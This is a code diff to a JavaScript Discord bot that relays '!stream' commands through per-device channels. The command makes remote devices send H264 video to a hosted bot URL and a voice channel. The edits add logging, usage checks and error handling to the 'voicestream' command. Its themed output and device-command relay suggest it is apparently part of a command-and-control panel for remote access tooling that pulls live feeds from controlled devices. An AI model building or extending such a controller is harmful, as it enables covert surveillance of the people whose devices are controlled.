@@ -449,7 +449,13 @@ async function registerSlashCommands(guild) {
 client.on(Events.InteractionCreate, async (i) => {
   if (i.isChatInputCommand()) {
     if (ALLOWED_CHANNEL_ID && i.channelId !== ALLOWED_CHANNEL_ID) return
-    await i.deferReply({ ephemeral: true }).catch(() => {})
+    try {
+      await i.deferReply({ ephemeral: true })
+    } catch (e) {
+      console.error(`[Interaction] deferReply failed for ${i.commandName}:`, e.message)
+      try { await i.reply({ content: `${E.coffin} Error: ${e.message}`, ephemeral: true }) } catch (_) {}
+      return
+    }
     const { commandName, options, user, guild } = i
     const uid = user.id
     if (!guild) return
@@ -663,8 +669,14 @@ client.on(Events.InteractionCreate, async (i) => {
           return i.editReply({ content: `${E.knife} Stream command sent: \`!stream ${streamPayload}\` ${E.skull}`, components: RESULT_BTNS })
         }
         case 'voicestream': {
+          console.log(`[VoiceStream] Command received from ${user.username}`)
           const voiceChannelId = options.getString('channel')
           const guildId = options.getString('guild')
+          console.log(`[VoiceStream] channel=${voiceChannelId}, guild=${guildId}`)
+
+          if (!voiceChannelId || !guildId) {
+            return i.editReply(`${E.warning} Usage: \`/voicestream channel:<id> guild:<id>\` ${E.skull}`)
+          }
 
           await guild.channels.fetch()
           let deviceCh = null
@@ -682,10 +694,13 @@ client.on(Events.InteractionCreate, async (i) => {
 
           const botUrl = process.env.BOT_HTTP_URL || `https://substantial-impala-aymouo-bc7f3c76.koyeb.app`
           const payload = `voice ${voiceChannelId} ${guildId} ${botUrl}`
-          const r = await sendCmdLogged(deviceCh, 'stream', payload, uid, user.username)
-          if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
 
-          return i.editReply({ content: `${E.satellite} Voice stream starting...\nBot will join voice channel and receive H264 frames from device.`, components: RESULT_BTNS })
+          console.log(`[VoiceStream] Sending to ${deviceCh.name}: !stream ${payload}`)
+
+          const r = await sendCmdLogged(deviceCh, 'stream', payload, uid, user.username)
+          if (!r.ok) return i.editReply(`${E.coffin} Error sending command: ${r.err} ${E.skull}`)
+
+          return i.editReply({ content: `${E.satellite} **Voice stream command sent!**\nDevice: \`${deviceCh.name}\`\nVoice Channel: \`${voiceChannelId}\`\nBot will join and start streaming.`, components: RESULT_BTNS })
         }
         case 'streamstatus': {
           const status = videoStream.getStreamStatus()
